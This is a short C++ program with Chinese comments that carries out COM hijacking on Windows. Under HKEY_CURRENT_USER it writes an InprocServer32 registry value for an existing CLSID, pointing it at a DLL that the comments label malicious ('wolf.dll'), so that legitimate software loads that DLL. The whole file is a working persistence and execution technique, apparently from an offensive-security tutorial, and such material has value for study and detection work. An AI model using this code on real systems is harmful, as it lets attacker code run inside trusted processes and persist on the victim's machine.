#include <windows.h>
#include <string.h>
#include <cstdio>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  //以下载的程序文件的CLSID为例
  const char* sk = "Software\\Classes\\CLSID\\{8369AB20-56C9-11D0-94E8-00AA0059CE02}\\InprocServer32";

  //恶意DLL文件地址
  const char* dll = "C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.dll";

  LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  } else {
    printf("Cannot create subkey value :(\n");
    return -1;
  }
  return 0;
}
